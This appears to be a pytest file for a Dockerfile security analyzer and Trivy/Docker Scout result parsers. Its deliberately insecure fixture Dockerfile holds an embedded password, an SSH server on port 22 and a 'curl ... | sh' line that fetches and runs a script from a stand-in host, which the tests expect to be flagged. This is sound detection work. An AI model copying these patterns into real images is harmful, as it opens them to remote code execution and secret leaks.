import json
import subprocess
from datetime import date

from app.security.analyzer import analyze_base_image, analyze_dockerfile_security
from app.security.scanners import parse_scout_sarif, parse_trivy, run_scout, run_trivy

TODAY = date(2026, 11, 5)
BAD = """FROM python:3.8
ARG DB_PASSWORD=hunter2
RUN curl -sSL http://x.io/i.sh | sh
RUN apt-get install -y openssh-server
EXPOSE 22
COPY . .
"""


def codes(r):
    return {f.code for f in r.findings}


def test_bad_dockerfile_findings():
    r = analyze_dockerfile_security(BAD, today=TODAY)
    assert {"runs-as-root", "embedded-secret", "pipe-to-shell", "risky-port", "risky-package", "eol-base-image"} <= codes(r)
    assert r.risk_level == "critical" and r.score < 40 and "cannot find vulnerable packages" in r.disclaimer


def test_clean_dockerfile_has_no_serious_findings():
    d = "FROM python:3.13-slim\nRUN useradd -r app\nUSER app\nEXPOSE 8000\nCMD [\"python\",\"a.py\"]\n"
    r = analyze_dockerfile_security(d, today=TODAY)
    assert r.counts["critical"] == r.counts["high"] == 0


def test_eol_table():
    assert analyze_base_image("node:18", 0, TODAY).eol_status == "eol"
    assert analyze_base_image("python:3.13-slim", 0, TODAY).eol_status == "supported"
    assert analyze_base_image("alpine", 0, TODAY).pinned_tag is False


def test_sensitive_file_in_context(tmp_path):
    (tmp_path / ".env").write_text("X=1")
    d = "FROM python:3.13-slim\nCOPY . .\nUSER 1000\n"
    leaked = analyze_dockerfile_security(d, "", project_root=tmp_path, today=TODAY)
    assert "sensitive-file-in-image" in codes(leaked) and ".env" in leaked.leaked_files
    safe = analyze_dockerfile_security(d, ".env\n", project_root=tmp_path, today=TODAY)
    assert "sensitive-file-in-image" not in codes(safe)


TRIVY = {"Metadata": {"OS": {"Family": "debian", "Name": "10", "EOSL": True}}, "Results": [
    {"Class": "os-pkgs", "Vulnerabilities": [
        {"VulnerabilityID": "CVE-1", "PkgName": "openssl", "Severity": "CRITICAL", "FixedVersion": "1.1"},
        {"VulnerabilityID": "CVE-2", "PkgName": "zlib", "Severity": "LOW"}]},
    {"Class": "lang-pkgs", "Vulnerabilities": [{"VulnerabilityID": "CVE-3", "PkgName": "flask", "Severity": "HIGH"}]}]}


def test_parse_trivy():
    r = parse_trivy(json.dumps(TRIVY), "img")
    assert r.counts["CRITICAL"] == 1 and r.counts["HIGH"] == 1 and r.fixable == 1
    assert r.by_class == {"os-pkgs": 2, "lang-pkgs": 1} and r.os_eol is True
    assert r.top(1)[0].id == "CVE-1" and any("end-of-life" in x for x in r.remediation())


def test_trivy_missing_and_runner():
    assert not run_trivy("i", which=lambda n: None).available
    ok = lambda *a, **k: subprocess.CompletedProcess(a, 0, json.dumps(TRIVY), "")  # noqa: E731
    assert run_trivy("i", runner=ok, which=lambda n: "/x").counts["CRITICAL"] == 1
    bad = lambda *a, **k: subprocess.CompletedProcess(a, 0, "not json", "")  # noqa: E731
    r = run_trivy("i", runner=bad, which=lambda n: "/x")
    assert not r.ok and "unparseable" in r.error
    def boom(*a, **k): raise subprocess.TimeoutExpired("trivy", 1)
    assert "timed out" in run_trivy("i", runner=boom, which=lambda n: "/x").error


def test_scout_sarif_best_effort():
    sarif = {"runs": [{"tool": {"driver": {"rules": []}}, "results": [
        {"ruleId": "CVE-9", "level": "error", "message": {"text": "bad"}}]}]}
    r = parse_scout_sarif(sarif, "i")
    assert r.counts["HIGH"] == 1 and "unverified" in r.notes[0]
    assert not run_scout("i", which=lambda n: None).available
